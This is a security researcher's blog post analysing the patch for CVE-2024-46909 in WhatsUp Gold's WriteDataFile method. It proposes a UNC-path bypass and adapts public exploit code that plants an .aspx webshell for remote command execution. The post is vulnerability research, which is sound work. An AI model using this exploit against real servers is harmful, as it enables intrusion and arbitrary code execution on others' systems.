---
layout: post
title: (CVE-2024-46909) Progress Software WhatsUp Gold WriteDataFile Directory Traversal Remote Code Execution Vulnerability 
tag:
- CVE
- RCE
---



I haven't done any CVE reverse engineer blogposts before but really wanted to do one, so I decided look at something this Advisory [https://www.zerodayinitiative.com/advisories/ZDI-24-1645/](https://www.zerodayinitiative.com/advisories/ZDI-24-1645/) looked interesting and I already had some idea about it from a past blogpost from the original finder of the same bug 
@SinSinology,  the vulnerable component name is same so it would be just a bypass of the old bug

Below you can find the original blogpost of the old bug, we have detailed blogpost and the poc too :

[https://summoning.team/blog/progress-whatsup-gold-writedatafile-cve-2024-4883-rce/](https://summoning.team/blog/progress-whatsup-gold-writedatafile-cve-2024-4883-rce/)

[https://github.com/sinsinology/CVE-2024-4883](https://github.com/sinsinology/CVE-2024-4883)


The details looks exactly the same I so quicly downloaded the patched version to do a patch diff [https://www.zerodayinitiative.com/advisories/ZDI-24-1645/](https://www.zerodayinitiative.com/advisories/ZDI-24-1645/) . I already had an old version installed so I took a backup of the following two files

```
C:\Program Files (x86)\Ipswitch\WhatsUp\NmAPI.exe
C:\Program Files (x86)\Ipswitch\WhatsUp\WUGDataAccess.dll
```

After downloading the latest version and installing it , I exported the source from dotPeek and did a diff using DiffMerge

The declaration of the `WriteDataFile` method is in the NmAPI.exe!NmAPI.CoreServices.cs

Here's the Diff version of the `WriteDataFile` method 

```diff
     public void WriteDataFile(EntityDataFileTransfer dataFile)
     {
-      if (dataFile.FileInfo.DirectoryName.Contains("..") || dataFile.FileInfo.DirectoryName.Contains(":") || dataFile.FileInfo.Name.Contains("..") || dataFile.FileInfo.Name.Contains(":"))

+      if (dataFile.FileInfo.DirectoryName.Contains("..") || dataFile.FileInfo.DirectoryName.Contains(":") || dataFile.FileInfo.Name.Contains("..") || dataFile.FileInfo.Name.Contains(":") || dataFile.FileInfo.Name.Contains<char>('\\') || dataFile.FileInfo.Name.Contains<char>('/') || dataFile.FileInfo.DirectoryName.StartsWith("\\") || dataFile.FileInfo.DirectoryName.StartsWith("/"))

         throw new ArgumentException("Invalid file or directory name");
       string str = Path.Combine(Directory.GetCurrentDirectory(), "Data" + dataFile.FileInfo.DirectoryName);
       string path = Path.Combine(str, dataFile.FileInfo.Name);

+      if (!Path.GetFullPath(path).StartsWith(Path.GetFullPath(str), StringComparison.OrdinalIgnoreCase))
+        throw new ArgumentException("Invalid directory");
       
       if (File.Exists(path))
       {
         File.SetAttributes(path, FileAttributes.Archive);
```

Initially the if checks for the `dataFile.FileInfo.DirectoryName` and `dataFile.FileInfo.Name` were added to resolve the old issue CVE-2024-4883 , we can see now they added more checks there

```cs
dataFile.FileInfo.Name.Contains<char>('\\')
dataFile.FileInfo.Name.Contains<char>('/')

dataFile.FileInfo.DirectoryName.StartsWith("\\")
dataFile.FileInfo.DirectoryName.StartsWith("/")
```

Basically they are just checking if the Name and DirectoryName property Contains or StartsWith `//` ,`\` characters or not.

For Windows `\\` is treated as Network Path (UNC Path) , for eg \\ServerName\SharedFolder . So I thought the bypass is related to that only , I went with this path of thinking , if C directory where Whatsupgold is installed is being shared then it might be accessible under `\\PC-Name\`

![image](https://gist.github.com/user-attachments/assets/f27b1a32-b63b-4143-b086-71fb77e2f3bf)

Just an example UNC path which could get pass the if check: `\\Desktop-5i7nkh0\c\Program Files (x86)\Ipswitch\WhatsUp\html\NmConsole`

--------------------------------


In the exploit which @SinSinology originaly wrote you can see how the path is specified. All we need to do replace the value for the `webshell_path` variable with the UNC one

```cs
            string webshell_path = @"C:\Program Files (x86)\Ipswitch\WhatsUp\html\NmConsole\" + webshell_name;

            EntityDataFileTransfer dataFile = new EntityDataFileTransfer
            {
                FileInfo = new EntityFileInfo
                {
                    DirectoryName = "test",
                    Name = webshell_path,
                    LastWriteTime = DateTime.Now
                },
                FileContents = System.IO.File.ReadAllBytes(webshell)
            };
            Console.WriteLine("(*) Using write what where primitive, to plant " + webshell_path);
            core_client.WriteDataFile(dataFile);
```

```cs
string webshell_path = @"\\Desktop-5i7nkh0\c\Program Files (x86)\Ipswitch\WhatsUp\html\NmConsole\" + webshell_name;
```

Then just Build the Solution and execute the binary. It will write the content pointed out by the  `webshell` file and it will be written in the `C:\Program Files (x86)\Ipswitch\WhatsUp\html\NmConsole\` on the targetted system.

Thus by visiting the uploaded .aspx file location we can execute arbitrary commands.

A small gif for the exploit in action:

![518N76pbo5](https://gist.github.com/user-attachments/assets/aa9b7906-53d9-4e1a-b673-788d285816fd)
